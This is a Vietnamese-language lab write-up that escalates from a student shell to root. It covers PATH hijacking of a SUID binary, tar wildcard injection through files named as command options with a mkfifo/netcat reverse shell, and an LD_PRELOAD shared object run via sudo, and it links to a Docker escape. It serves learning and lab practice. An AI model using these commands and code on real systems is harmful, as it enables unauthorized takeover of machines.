# Mở đầu 
![](https://images.viblo.asia/797319b5-9a1a-4562-b276-d6af32b7c71b.PNG)

Bài lab hôm nay là một bài khá là hay với mức độ được đánh giá là trung bình. Mục tiêu của ta là lấy được 4 Flag

# Write-up
Ở bài này khi truy cập thì ta sẽ có shell của user student 
## Teacher
Kiểm tra các file có SUID bằng lệnh `find / 2>/dev/null -perm -u=s` 
![](https://images.viblo.asia/5e8d035b-1080-4ebe-8b92-2a04614b8d09.PNG)

Ta thấy 2 file được SUID 
![](https://images.viblo.asia/5e8d035b-1080-4ebe-8b92-2a04614b8d09.PNG)

Vì đây là 1 file khá lạ lên mình chạy thử thì trả về một bảng kết quả 
![](https://images.viblo.asia/ab0c41c1-b41e-4a80-ab38-f0653b342c0b.PNG)

Mình đoán sẽ phải dùng file này để leo thang lên teacher nên mình sử dụng lệnh **ltrace** xem file gọi những thư viện nào

`ltrace read-submission`

![](https://images.viblo.asia/0d868673-6789-4ba5-ae11-b430859c8b7c.PNG)

Để ý ở đây file này gọi đến một file tên là *read-file* nhưng mình không thấy ở đây có hàm set path nên mình nghĩ ngay đến việc làm giả file read-file và thêm vào biến PATH thư mục có chứa file *read-file* giả mạo
```
echo "/bin/bash -i" > read-file
chmod 777 read-file
export PATH=`pwd`:$PATH
read-submission 
```
Đầu tiên, mình tạo file *read-file* giả mạo chứa /bin/bash -i. Sau đó ta chỉ cần phải thêm quyền thực thi cho file vừa tạo nhưng mình để 777 luôn cho nhanh. Tiếp theo mình thêm thư mục có chứa file *read-file* giả mạo vào đầu của biến PATH và chạy lại file *read-submission* thì ta sẽ có shell của teacher.
![](https://images.viblo.asia/8a523594-4b18-4c85-8624-ee76260b38f3.PNG)
## Admin
Dùng lệnh `ps -aux` thì mình phát hiện có cron đang chạy 
![](https://images.viblo.asia/6e7526f2-2a91-46e0-bfd5-93b377a4fdef.PNG)
Nhưng mình kiểm tra tất cả các file trong /etc/cron* không thấy có file cấu hình nào cả nên mình đoán có một cron của admin đang chạy ẩn. Do không mình không thể kết nối đến internet nên mình sẽ dùng bash để quan sát các tiến trình <br>
`for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;`
![](https://images.viblo.asia/45c6a14d-1e10-4a72-96a2-17d302c2a944.PNG)<br>
Sau một hồi tìm kiếm thì mình biết được có cách tạo shell bằng tar. Vì ở đây có dấu wildcards(\*) nên ta có thể lợi dụng để khai thác. Dành cho các bạn chưa biết thì wildcards sẽ được thực thi trước câu lệnh. Các lệnh mình sử dụng ở đây là:
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc localhost 1234 >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
Lệnh đầu tiên để tạo reverse shell và ghi vào file shell .sh. Lệnh thứ 2 và 3 tạo ra các file tên là **--checkpoint-action=exec=sh shell.sh** và **--checkpoint=1** <br>
*Lưu ý: các file trên đều nằm trong thư mục /home/teacher/backup*

Bật một shell khác và chạy lệnh <br>
`nc -lnvp 1234`

![](https://images.viblo.asia/ffdb313f-e82a-4b3c-96a7-c33075c40a4d.PNG)

Và ta đã có được shell của admin 
## Root
Kiểm tra với sudo -l ta thấy admin có thể chạy lệnh apche2 với quyền root mà không cần mật khẩu
![](https://images.viblo.asia/2aee6bba-9ba3-411f-9cb5-3091c49412b0.PNG)
Để ý ta thấy có option env_keep+=LD_PRELOAD cho giữ lại biến môi trường LD_PRELOAD khi thực thi bằng sudo. Ta sẽ lợi dụng option này để leo thang lên root.<br>

Dành cho bạn nào chưa biết thì biến LD_PRELOAD dùng để load các Shared library trước cả các Standard library và cho phép ta ghi đè lên các fuction của các library khác. Ở đây ta sẽ ghi đè vào fuction \_init() , khi Shared library được load nếu nó có fuction \_init() thì funcion này sẽ được gọi đầu tiên hay nói cách khác khi load một thư viện thì function \_init ()sẽ được chạy đầu tiên.
Tạo một file shell.c có nội dung như sau
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```
*Nếu bạn thắc mắc tại sao cần phải unsetenv("LDP_RELOAD") thì biến này sẽ được kế thừa bởi các tiến trình con lên khi gọi system("/bin/sh") nó sẽ gọi lại chính \_init tạo ra vòng lặp vô hạn* 

Tiếp theo tạo một shared object <br>
`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

Lấy root thôi <br>
`sudo LD_PRELOAD=/tmp/shell.so apache2`

![](https://images.viblo.asia/ca0a0dce-3375-49fa-a397-64d03832c9b0.PNG)
## Docker escape
Trong phần mô tả của bài này có yêu cầu mình phải thoát ra khỏi máy ảo và phần này mình đã làm xong nhưng cũng còn chưa hiểu rõ cách thức hoạt động nên mình xin phép để link cách khai thác ở  [đây](https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd)
# Conclusion
Ở bài này mình học được khá là nhiều thứ mới như LD_PRELOAD , Docker escape , leo thang bằng tar và sử dụng ltrace để theo dõi hành vi của chương trình